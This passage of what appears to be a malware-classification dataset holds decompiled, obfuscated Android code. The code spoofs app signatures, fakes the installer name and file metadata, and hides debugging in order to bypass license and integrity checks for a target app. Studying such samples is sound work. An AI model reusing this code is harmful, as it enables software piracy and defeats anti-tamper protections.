!name2.equals(uk7GtkPSon.WyhOMoovQIVEK(23)) || !name.equals(uk7GtkPSon.WyhOMoovQIVEK(24))) {                   break;                 }                 Object obj3=objArr2[0];                 objArr2=(Object[])objArr2[1];                 method2=(Method)obj2;                 obj2=obj3;               }  else               if (name.equals(uk7GtkPSon.WyhOMoovQIVEK(21))) {                 return Boolean.valueOf(zPmNuMYJ.dRRJbLOi29());               }             }  else             if (name.equals(uk7GtkPSon.WyhOMoovQIVEK(19))) {               return zPmNuMYJ.TfhOorGg8((Context)obj2);             }           }  else           if (zPmNuMYJ.OPvIwJDQKQg4jW((File)obj2)) {             if (name.equals(uk7GtkPSon.WyhOMoovQIVEK(16))) {               return Long.valueOf(zPmNuMYJ.Tm8MCb1OR((File)obj2));             }             if (name.equals(uk7GtkPSon.WyhOMoovQIVEK(17))) {               return Long.valueOf(zPmNuMYJ.fHsVD1phHb4H((File)obj2));             }           }         }  else {           if (!name.equals(uk7GtkPSon.WyhOMoovQIVEK(12)) && !name.equals(uk7GtkPSon.WyhOMoovQIVEK(13))) {             if (name.equals(uk7GtkPSon.WyhOMoovQIVEK(14))) {               return true;             }           }           return null;         }       }  else {         break;       }     }     if (name.equals(uk7GtkPSon.WyhOMoovQIVEK(5))) {       return zPmNuMYJ.rlS1PgA15VirGW((PackageManager)obj2,(String)objArr2[0]);     }     if (!name.equals(uk7GtkPSon.WyhOMoovQIVEK(6))) {       if (name.equals(uk7GtkPSon.WyhOMoovQIVEK(9))) {         return Integer.valueOf(zPmNuMYJ.LVpnVtxF8svMU((PackageManager)obj2,(String)objArr2[0]));       }       if (name.equals(uk7GtkPSon.WyhOMoovQIVEK(10))) {         return objArr2[0].getClass().equals(String.class) ? Integer.valueOf(zPmNuMYJ.rEkoCHEPv1Q((PackageManager)obj2,(String)objArr2[0],(String)objArr2[1])) : Integer.valueOf(zPmNuMYJ.rEkoCHEPv1Q((PackageManager)obj2,((Integer)objArr2[0]).intValue(),((Integer)objArr2[1]).intValue()));       }       return method2.invoke(obj2,objArr2);     }     int intValue=((Integer)objArr2[1]).intValue();     if (name2.equals(uk7GtkPSon.WyhOMoovQIVEK(2))) {       return zPmNuMYJ.xcTEJeJ2OrFy((PackageManager)obj2,(String)objArr2[0],intValue);     }     Object invoke=method2.invoke(obj2,objArr2);     if ((intValue & 64) == 64) {       System.arraycopy(zPmNuMYJ.OPvIwJDQKQg4jW(),0,((PackageInfo)invoke).signatures,0,((PackageInfo)invoke).signatures.length);       String str=uk7GtkPSon.WyhOMoovQIVEK(7) + ((PackageInfo)invoke).signatures + uk7GtkPSon.WyhOMoovQIVEK(8)+ ((PackageInfo)invoke).packageName;     }     return invoke;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\zA9nBKIBi\uk7GtkPSon.code","class uk7GtkPSon {   private static final char[][] S99Oq5FOuo7g6H={new char[]{'a','n','d','r','o','i','d','.','a','p','p','.','C','o','n','t','e','x','t','I','m','p','l','$','A','p','p','l','i','c','a','t','i','o','n','P','a','c','k','a','g','e','M','a','n','a','g','e','r'},new char[]{'a','n','d','r','o','i','d','.','a','p','p','.','A','p','p','l','i','c','a','t','i','o','n','C','o','n','t','e','x','t','$','A','p','p','l','i','c','a','t','i','o','n','P','a','c','k','a','g','e','M','a','n','a','g','e','r'},new char[]{'a','n','d','r','o','i','d','.','c','o','n','t','e','n','t','.','p','m','.','P','a','c','k','a','g','e','M','a','n','a','g','e','r'},new char[]{'a','n','d','r','o','i','d','.'},new char[]{'A','p','p','l','i','c','a','t','i','o','n','P','a','c','k','a','g','e','M','a','n','a','g','e','r'},new char[]{'g','e','t','I','n','s','t','a','l','l','e','r','P','a','c','k','a','g','e','N','a','m','e'},new char[]{'g','e','t','P','a','c','k','a','g','e','I','n','f','o'},new char[]{' ',' ','s','p','o','o','f','i','n','g',' '},new char[]{' ','s','i','g','n','a','t','u','r','e','s',' ','f','o','r',' '},new char[]{'g','e','t','A','p','p','l','i','c','a','t','i','o','n','E','n','a','b','l','e','d','S','e','t','t','i','n','g'},new char[]{'c','h','e','c','k','S','i','g','n','a','t','u','r','e','s'},new char[]{'j','c','e','.','p','r','o','v','i','d','e','r','.','J','D','K','D','i','g','e','s','t','S','i','g','n','a','t','u','r','e'},new char[]{'i','n','i','t','V','e','r','i','f','y'},new char[]{'u','p','d','a','t','e'},new char[]{'v','e','r','i','f','y'},new char[]{'j','a','v','a','.','i','o','.','F','i','l','e'},new char[]{'l','e','n','g','t','h'},new char[]{'l','a','s','t','M','o','d','i','f','i','e','d'},new char[]{'a','n','d','r','o','i','d','.','c','o','n','t','e','n','t','.','C','o','n','t','e','x','t'},new char[]{'g','e','t','A','p','p','l','i','c','a','t','i','o','n','I','n','f','o'},new char[]{'a','n','d','r','o','i','d','.','o','s','.','D','e','b','u','g'},new char[]{'i','s','D','e','b','u','g','g','e','r','C','o','n','n','e','c','t','e','d'},new char[]{'j','a','v','a','.','l','a','n','g','.'},new char[]{'j','a','v','a','.','l','a','n','g','.','r','e','f','l','e','c','t','.','M','e','t','h','o','d'},new char[]{'i','n','v','o','k','e'},new char[]{'.','a','p','k'},new char[]{'i','s','K','e','y','P','a','c','k','a','g','e','('},new char[]{')'},new char[]{'.'},new char[]{'(','?','i','m',')','(','p','r','o','|','f','u','l','l','|','d','o','n','a','t','e','|','k','e','y','|','u','n','l','o','c','k',')'},new char[]{' ',' ','r','e','s','u','l','t',' ','=',' '},new char[]{'c','h','e','c','k','S','i','g','n','a','t','u','r','e','s','('},new char[]{',',' '},new char[]{')',',',' ','c','a','l','l','i','n','g',' ','s','t','r','i','n','g',' ','v','e','r','s','i','o','n'},new char[]{' ',' ','r','e','a','l',' ','r','e','s','u','l','t',' ','=',' '},new char[]{' ',' ','r','e','t','u','r','n','i','n','g',':',' '},new char[]{'g','e','t','A','p','p','l','i','c','a','t','i','o','n','E','n','a','b','l','e','d','S','e','t','t','i','n','g','('},new char[]{')',' ','=',' '},new char[]{'c','o','m','.','g','o','o','g','l','e','.','a','n','d','r','o','i','d','.','f','e','e','d','b','a','c','k'},new char[]{'g','e','t','I','n','s','t','a','l','l','e','r','P','a','c','k','a','g','e','N','a','m','e','('},new char[]{')',' ','r','e','t','u','r','n','i','n','g',' '},new char[]{' ','b','u','t',' ','r','e','a','l','l','y',' ','i','t','\'','s',':',' '},new char[]{'g','e','t','P','a','c','k','a','g','e','I','n','f','o','('},new char[]{'s','p','o','o','f','i','n','g',' ','f','i','l','e',' ','m','o','d','i','f','i','e','d',' ','o','f',' '},new char[]{' ','w','i','t','h',' '},new char[]{'s','p','o','o','f','i','n','g',' ','f','i','l','e',' ','l','e','n','g','t','h',' ','o','f',' '},new char[]{'a','n','t','i','l','v','l'},new char[]{'t','o','a','s','t','('}};   uk7GtkPSon(){   }   public static String WyhOMoovQIVEK(  int i){     return new String(S99Oq5FOuo7g6H[i]);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\zA9nBKIBi\zPmNuMYJ.code","public final class zPmNuMYJ {   protected static Context f2h7Yhzkfhb3=null;   private static final int h7Yhzkfhb3=Integer.parseInt(""0"");   private static final int mi6tUWsN9xbMYvaEg2=Integer.parseInt(""0"");   public static void CyYeKu0E9D2(  Object obj){     if (f2h7Yhzkfhb3 == null) {       return;     }     Toast makeText=Toast.makeText(f2h7Yhzkfhb3,obj.toString(),1);     makeText.setGravity(49,0,0);     makeText.show();     String str=uk7GtkPSon.WyhOMoovQIVEK(47) + obj.toString() + uk7GtkPSon.WyhOMoovQIVEK(27);   }   public static int LVpnVtxF8svMU(  PackageManager packageManager,  String str){     int i;     try {       i=packageManager.getApplicationEnabledSetting(str);     }  catch (    IllegalArgumentException e) {       i=0;     }     if (i == 2) {       i=0;     }     String str2=uk7GtkPSon.WyhOMoovQIVEK(36) + str + uk7GtkPSon.WyhOMoovQIVEK(37)+ i;     return i;   }   public static boolean OPvIwJDQKQg4jW(  File file){     boolean z=file.exists() ? false : false;     if (file.getName().contains(""kr.aboy.rodjx"") && file.getName().endsWith(uk7GtkPSon.WyhOMoovQIVEK(25))) {       return true;     }     return z;   }   private static boolean OPvIwJDQKQg4jW(  String str){     int lastIndexOf;     String str2=uk7GtkPSon.WyhOMoovQIVEK(26) + str + uk7GtkPSon.WyhOMoovQIVEK(27);     boolean z=(""%!KeyPackage%"".length() > 0 && str.equals(""%!KeyPackage%"")) || str.startsWith(""kr.aboy.rodjx"") || ((lastIndexOf=""kr.aboy.rodjx"".lastIndexOf(uk7GtkPSon.WyhOMoovQIVEK(28))) > 0 && (str.startsWith(""kr.aboy.rodjx"".substring(0,lastIndexOf)) || str.matches(uk7GtkPSon.WyhOMoovQIVEK(29))));     String str3=uk7GtkPSon.WyhOMoovQIVEK(30) + z;     return z;   }   public static Signature[] OPvIwJDQKQg4jW(){     int parseInt=Integer.parseInt(""343"");     Signature[] signatureArr=new Signature[parseInt];     for (int i=0; i < parseInt; i++) {       signatureArr[i]=new Signature(""308201c53082012ea00302010202044c147c55300d06092a864886f70d01010505003027310e300c0603550407130553656f756c311530130603550403130c4d696e2d4b79752052796f6f301e170d3130303631333036333630355a170d3335303630373036333630355a3027310e300c0603550407130553656f756c311530130603550403130c4d696e2d4b79752052796f6f30819f300d06092a864886f70d010101050003818d0030818902818100975e88ccfe74a3d260313444096494744494d6dbbac97696046e762a0a518a1cb2799fc2f4344a6198a1f9e24a82030592e2e84a8ea58277c4b924fbee2c18650a5c851d0f7c1f9af7754d18db33956846c67de9d1db0b76d79e7223773dd730b18147dbf694779f9c467b70f010aaa8e6ca8e9ffdcb93ce40b3c4f8ba75a36b0203010001300d06092a864886f70d0101050500038181002b9906dc6a2e199b6f756990f32ffe4f68a0e425f1557f9f074ccaae8e3867940ae6e20c8d613eeb158990a7cb5104fefd53b72bf4d353fae62b488222c19284d9b602348e9e3109569708a213ebf5c64ce4126dc56c132b67edb6ca20a9fe80d1fb28a752a4b2f9946b37a0466efb772b7d45f2dc48b77f56a96d53abe060ca"");     }     return signatureArr;   }   public static ApplicationInfo TfhOorGg8(  Context context){     ApplicationInfo applicationInfo=context.getApplicationInfo();     applicationInfo.flags&=-3;     return applicationInfo;   }   public static long Tm8MCb1OR(  File file){     long parseLong=Long.parseLong(""4442865"");     if (OPvIwJDQKQg4jW(file)) {       return parseLong;     }     long length=file.length();     String str=uk7GtkPSon.WyhOMoovQIVEK(45) + file.getName() + uk7GtkPSon.WyhOMoovQIVEK(44)+ length;     return length;   }   public static void VKbgvMbkba(){   }   public static void Vqeebr9Y7KD(  Object obj){     Log.d(uk7GtkPSon.WyhOMoovQIVEK(46),String.valueOf(obj));   }   public static void aGqYs60hLPXUk(  Context context){     if (f2h7Yhzkfhb3 == null) {       f2h7Yhzkfhb3=context;     }   }   public static boolean dRRJbLOi29(){     return false;   }   public static long fHsVD1phHb4H(  File file){     long parseLong=Long.parseLong(""1334305213200"");     if (OPvIwJDQKQg4jW(file)) {       return parseLong;     }     long lastModified=file.lastModified();     String str=uk7GtkPSon.WyhOMoovQIVEK(43) + file.getName() + uk7GtkPSon.WyhOMoovQIVEK(44)+ lastModified;     return lastModified;   }   public static void hCCjPO56BvijN(  Context context){     aGqYs60hLPXUk(context);   }   public static void pSFy7cdWfXh(){   }   public static int rEkoCHEPv1Q(  PackageManager packageManager,  int i,  int i2){     String str=uk7GtkPSon.WyhOMoovQIVEK(31) + i + uk7GtkPSon.WyhOMoovQIVEK(32)+ i2+ uk7GtkPSon.WyhOMoovQIVEK(33);     return rEkoCHEPv1Q(packageManager,packageManager.getPackagesForUid(i)[0],packageManager.getPackagesForUid(i2)[0]);   }   public static int rEkoCHEPv1Q(  PackageManager packageManager,  String str,  String str2){     String str3=uk7GtkPSon.WyhOMoovQIVEK(31) + str + uk7GtkPSon.WyhOMoovQIVEK(32)+ str2+ uk7GtkPSon.WyhOMoovQIVEK(27);     int checkSignatures=packageManager.checkSignatures(str,str2);     String str4=uk7GtkPSon.WyhOMoovQIVEK(34) + checkSignatures;     if (checkSignatures != 0) {       if (h7Yhzkfhb3 == 0) {         if (str.equals(""kr.aboy.rodjx"") || (str2.equals(""kr.aboy.rodjx"") && (OPvIwJDQKQg4jW(str) || OPvIwJDQKQg4jW(str2)))) {           checkSignatures=0;         }       }  else       if (h7Yhzkfhb3 == 1) {         if (checkSignatures != -4 && checkSignatures != 0) {           checkSignatures=0;         }       }  else       if (h7Yhzkfhb3 == 2) {         checkSignatures=0;       }       String str5=uk7GtkPSon.WyhOMoovQIVEK(35) + checkSignatures;     }     return checkSignatures;   }   public static String rlS1PgA15VirGW(  PackageManager packageManager,  String str){     String installerPackageName=packageManager.getInstallerPackageName(str);     if (installerPackageName == null) {       installerPackageName=uk7GtkPSon.WyhOMoovQIVEK(38);     }     String str2=uk7GtkPSon.WyhOMoovQIVEK(39) + str + uk7GtkPSon.WyhOMoovQIVEK(40)+ installerPackageName+ uk7GtkPSon.WyhOMoovQIVEK(41)+ packageManager.getInstallerPackageName(str);     return installerPackageName;   }   public static PackageInfo xcTEJeJ2OrFy(  PackageManager packageManager,  String str,  int i){     PackageInfo packageInfo;     String str2=uk7GtkPSon.WyhOMoovQIVEK(42) + str + uk7GtkPSon.WyhOMoovQIVEK(27);     try {       packageInfo=OPvIwJDQKQg4jW(str) ? packageManager.getPackageInfo(""kr.aboy.rodjx"",i) : packageManager.getPackageInfo(str,i);     }  catch (    PackageManager.NameNotFoundException e) {       if (mi6tUWsN9xbMYvaEg2 == 1) {         throw e;       }       if (!OPvIwJDQKQg4jW(str)) {         throw new PackageManager.NameNotFoundException();       }       packageInfo=packageManager.getPackageInfo(""kr.aboy.rodjx"",i);     }     if ((i & 64) == 64) {       System.arraycopy(OPvIwJDQKQg4jW(),0,packageInfo.signatures,0,packageInfo.signatures.length);       String str3=uk7GtkPSon.WyhOMoovQIVEK(7) + packageInfo.signatures.length + uk7GtkPSon.WyhOMoovQIVEK(8)+ str;     }     return packageInfo;   } } "
